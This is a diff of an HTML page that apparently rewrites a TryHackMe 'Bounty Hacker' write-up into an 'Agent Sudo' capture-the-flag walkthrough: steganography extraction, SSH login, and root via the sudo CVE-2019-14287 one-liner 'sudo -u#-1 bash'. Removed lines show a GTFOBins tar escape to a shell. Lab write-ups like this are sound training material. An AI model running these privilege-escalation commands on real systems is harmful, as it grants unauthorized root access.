+      <img class="my-0 rounded-md" loading="lazy" src="./img/10.png" alt="Image 10" />
+      
+    </figure>
+
+Now that we&rsquo;ve got the password, we can unzip the file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="mi">7</span><span class="n">z</span> <span class="n">x</span> <span class="mi">8702</span><span class="o">.</span><span class="n">zip</span> 
+</span></span></code></pre></div><p>There is a note called <strong>To_agentR.txt</strong>.
+
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="./img/11.png" alt="Image 11" />
+      
+    </figure>
+
+The text in quotation marks is a <strong>base64 string</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">echo</span> <span class="s2">&#34;QXJlYTUx&#34;</span> <span class="o">|</span> <span class="n">base64</span> <span class="o">-</span><span class="n">d</span>
+</span></span></code></pre></div><p>Once it&rsquo;s decoded shows the word <strong>Area51</strong>.
+
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="./img/12.png" alt="Image 12" />
       
     </figure>
 </p>
-<p>Hydra found the credentials <strong>lin:RedDr4gonSynd1cat3</strong>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">ssh</span> <span class="n">lin</span><span class="err">@</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">12</span><span class="o">.</span><span class="mi">22</span>
-</span></span></code></pre></div>
+
+
+<h3 class="relative group">Steghide 
+    <div id="steghide" class="anchor"></div>
+    
+</h3>
+<blockquote>
+<p>Steghide is a steganography program that is able to hide data in various kinds of images and audio-files.</p>
+</blockquote>
+<p>The image <strong>cute-alien.png</strong> has hidden info as well, we can take a peek with <strong>steghide</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">steghide</span> <span class="n">info</span> <span class="n">cute</span><span class="o">-</span><span class="n">alien</span><span class="o">.</span><span class="n">jpg</span>
+</span></span></code></pre></div><p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="./img/13.png" alt="Image 13" />
+      
+    </figure>
+
+There is a file called <strong>message.txt</strong>, we&rsquo;re extracting it with steghide again.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">steghide</span> <span class="n">extract</span> <span class="o">-</span><span class="n">sf</span> <span class="n">cute</span><span class="o">-</span><span class="n">alien</span><span class="o">.</span><span class="n">jpg</span>
+</span></span></code></pre></div><p>In the hidden file there are credentials that we can use to log into the ssh service.
+
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="./img/14.png" alt="Image 14" />
+      
+    </figure>
+</p>
+
 
 <h2 class="relative group">Privilege escalation 
     <div id="privilege-escalation" class="anchor"></div>
     
 </h2>
 <hr>
-<p>The first thing to do once we&rsquo;re in, is to <strong>adapt the shell</strong> to be able to execute any command without tty problems.</p>
+<p>We&rsquo;re logging in with the user <strong>james</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">ssh</span> <span class="n">james</span><span class="err">@</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">126</span><span class="o">.</span><span class="mi">126</span>
+</span></span></code></pre></div><p>For comfort reasons, we can improve a little the shell setting up the <strong>TERM variable</strong>.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">export</span> <span class="no">TERM</span><span class="o">=</span><span class="n">xterm</span>
-</span></span><span class="line"><span class="cl"><span class="n">export</span> <span class="no">SHELL</span><span class="o">=</span><span class="n">bash</span>
-</span></span></code></pre></div><p>The user flag is in <strong>/home/lin/Desktop/</strong>.</p>
-<p>
+</span></span></code></pre></div><p>There are two files in the directory, another image and an image that could be another steganography thing. We can download de file with scp:
+
     <figure>
-      <img
-        class="my-0 rounded-md"
-        loading="lazy"
-        srcset="
-        /writeups/tryhackme/easy/bounty-hacker/img/6_hu62a6d937cdbf6e6e4fc48a24256e5c5a_20815_330x0_resize_box_3.png 330w,
-        /writeups/tryhackme/easy/bounty-hacker/img/6_hu62a6d937cdbf6e6e4fc48a24256e5c5a_20815_660x0_resize_box_3.png 660w,
-        /writeups/tryhackme/easy/bounty-hacker/img/6_hu62a6d937cdbf6e6e4fc48a24256e5c5a_20815_1024x0_resize_box_3.png 1024w,
-        /writeups/tryhackme/easy/bounty-hacker/img/6_hu62a6d937cdbf6e6e4fc48a24256e5c5a_20815_1320x0_resize_box_3.png 2x"
-        src="/writeups/tryhackme/easy/bounty-hacker/img/6_hu62a6d937cdbf6e6e4fc48a24256e5c5a_20815_660x0_resize_box_3.png"
-        alt="Image 6"
-      />
+      <img class="my-0 rounded-md" loading="lazy" src="./img/15.png" alt="Image 15" />
       
     </figure>
 </p>
-<p>We can look for <strong>sudo permissions</strong> to see what we can execute with sudo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">scp</span> <span class="n">james</span><span class="err">@</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">126</span><span class="o">.</span><span class="mi">126</span><span class="ss">:Alien_autospy</span><span class="o">.</span><span class="n">jpg</span> <span class="o">.</span>
+</span></span></code></pre></div><p>If we take a look at the sudo permissions, we&rsquo;ll find that we only have permissions over bash but it does&rsquo;nt work.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
-</span></span></code></pre></div><p>We&rsquo;ve got sudo permissions on the binary <strong>/bin/tar</strong>.
-
+</span></span></code></pre></div><p>
     <figure>
-      <img
-        class="my-0 rounded-md"
-        loading="lazy"
-        srcset="
-        /writeups/tryhackme/easy/bounty-hacker/img/7_hu83d5ed5744afc65abc1d47c4a5d5923f_196476_330x0_resize_box_3.png 330w,
-        /writeups/tryhackme/easy/bounty-hacker/img/7_hu83d5ed5744afc65abc1d47c4a5d5923f_196476_660x0_resize_box_3.png 660w,
-        /writeups/tryhackme/easy/bounty-hacker/img/7_hu83d5ed5744afc65abc1d47c4a5d5923f_196476_1024x0_resize_box_3.png 1024w,
-        /writeups/tryhackme/easy/bounty-hacker/img/7_hu83d5ed5744afc65abc1d47c4a5d5923f_196476_1320x0_resize_box_3.png 2x"
-        src="/writeups/tryhackme/easy/bounty-hacker/img/7_hu83d5ed5744afc65abc1d47c4a5d5923f_196476_660x0_resize_box_3.png"
-        alt="Image 7"
-      />
+      <img class="my-0 rounded-md" loading="lazy" src="./img/16.png" alt="Image 16" />
       
     </figure>
 
-In <a href="https://gtfobins.github.io/gtfobins/tar/" target="_blank">GTFOBins</a> there is a command to exploit it.
-
+Taking a look on the sudo version, we&rsquo;ll find that it&rsquo;s a vulnerable version.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">sudo</span> <span class="o">--</span><span class="n">version</span>
+</span></span></code></pre></div><p>
     <figure>
-      <img
-        class="my-0 rounded-md"
-        loading="lazy"
-        srcset="
-        /writeups/tryhackme/easy/bounty-hacker/img/8_hu2d7712d7e5a0bd5fe4928874e2cfdcd0_22253_330x0_resize_box_3.png 330w,
-        /writeups/tryhackme/easy/bounty-hacker/img/8_hu2d7712d7e5a0bd5fe4928874e2cfdcd0_22253_660x0_resize_box_3.png 660w,
-        /writeups/tryhackme/easy/bounty-hacker/img/8_hu2d7712d7e5a0bd5fe4928874e2cfdcd0_22253_1024x0_resize_box_3.png 1024w,
-        /writeups/tryhackme/easy/bounty-hacker/img/8_hu2d7712d7e5a0bd5fe4928874e2cfdcd0_22253_1320x0_resize_box_3.png 2x"
-        src="/writeups/tryhackme/easy/bounty-hacker/img/8_hu2d7712d7e5a0bd5fe4928874e2cfdcd0_22253_660x0_resize_box_3.png"
-        alt="Image 8"
-      />
+      <img class="my-0 rounded-md" loading="lazy" src="./img/17.png" alt="Image 17" />
       
     </figure>
-</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">tar</span> <span class="o">-</span><span class="n">cf</span> <span class="sr">/dev/nu</span><span class="n">ll</span> <span class="sr">/dev/nu</span><span class="n">ll</span> <span class="o">--</span><span class="n">checkpoint</span><span class="o">=</span><span class="mi">1</span> <span class="o">--</span><span class="n">checkpoint</span><span class="o">-</span><span class="n">action</span><span class="o">=</span><span class="nb">exec</span><span class="o">=</span><span class="sr">/bin/s</span><span class="n">h</span>
-</span></span></code></pre></div><p>Once we execute it we&rsquo;ve the root shell.
+
+Looking for the vulnerability found this <a href="https://www.mend.io/blog/new-vulnerability-in-sudo-cve-2019-14287/" target="_blank">page</a>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">sudo</span> <span class="o">-</span><span class="n">u</span><span class="c1">#-1 bash</span>
+</span></span></code></pre></div><p>If the command is executed, we&rsquo;ll gain a root shell.
 
     <figure>
-      <img
-        class="my-0 rounded-md"
-        loading="lazy"
-        srcset="
-        /writeups/tryhackme/easy/bounty-hacker/img/9_hu01f5708333478d41662cca8222724092_8530_330x0_resize_box_3.png 330w,
-        /writeups/tryhackme/easy/bounty-hacker/img/9_hu01f5708333478d41662cca8222724092_8530_660x0_resize_box_3.png 660w,
-        /writeups/tryhackme/easy/bounty-hacker/img/9_hu01f5708333478d41662cca8222724092_8530_1024x0_resize_box_3.png 1024w,
-        /writeups/tryhackme/easy/bounty-hacker/img/9_hu01f5708333478d41662cca8222724092_8530_1320x0_resize_box_3.png 2x"
-        src="/writeups/tryhackme/easy/bounty-hacker/img/9_hu01f5708333478d41662cca8222724092_8530_660x0_resize_box_3.png"
-        alt="Image 9"
-      />
+      <img class="my-0 rounded-md" loading="lazy" src="./img/18.png" alt="Image 18" />
       
     </figure>
 </p>
@@ -859,6 +875,79 @@ In <a href="https://gtfobins.github.io/gtfobins/tar/" target="_blank">GTFOBins</
         
         <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
           href="/writeups/tryhackme/medium/anonymous/">Anonymous</div>
+        
+
+        <div class="text-sm text-neutral-500 dark:text-neutral-400">
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+
+  
+  
+</div>
+
+
+
+
+
+
+
+        </div>
+
+        
+      </div>
+      <div class="px-6 pt-4 pb-2">
+
+      </div>
+    </div>
+  </a>
+
+  
+  
+
+  <a href="/writeups/tryhackme/easy/bounty-hacker/" class="min-w-full">
+    
+    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
+        
+        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/writeups/tryhackme/easy/bounty-hacker/featured_hu987505c17c9ba0995f15aab3061797a0_1131773_600x0_resize_box_3.png);"></div>
+        
+      
+
+      <div class="px-6 py-4">
+
+        
+        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
+          href="/writeups/tryhackme/easy/bounty-hacker/">Bounty Hacker</div>
         
 
         <div class="text-sm text-neutral-500 dark:text-neutral-400">
@@ -990,79 +1079,6 @@ In <a href="https://gtfobins.github.io/gtfobins/tar/" target="_blank">GTFOBins</
   </a>
 
   
-  
-
-  <a href="/writeups/tryhackme/easy/rootme/" class="min-w-full">
-    
-    <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
-        
-        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/writeups/tryhackme/easy/rootme/featured_hu168abec52627c69355d93ca235ba605f_133379_600x0_resize_box_3.png);"></div>
-        
-      
-
-      <div class="px-6 py-4">
-
-        
-        <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
-          href="/writeups/tryhackme/easy/rootme/">Rootme</div>
-        
-
-        <div class="text-sm text-neutral-500 dark:text-neutral-400">
-          
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<div class="flex flex-row flex-wrap items-center">
-  
-  
-
-  
-  
-</div>
-
-
-
-
-
-
-
-        </div>
-
-        
-      </div>
-      <div class="px-6 pt-4 pb-2">
-
-      </div>
-    </div>
-  </a>
-
-  
 </section>
 
   
@@ -1076,8 +1092,8 @@ In <a href="https://gtfobins.github.io/gtfobins/tar/" target="_blank">GTFOBins</
           
         
       <script>
-        var oid = "views_Writeups\/TryHackMe\/Easy\/Bounty Hacker\/index.md"
-        var oid_likes = "likes_Writeups\/TryHackMe\/Easy\/Bounty Hacker\/index.md"
+        var oid = "views_Writeups\/TryHackMe\/Easy\/Agent Sudo\/index.md"
+        var oid_likes = "likes_Writeups\/TryHackMe\/Easy\/Agent Sudo\/index.md"
       </script>
       
       
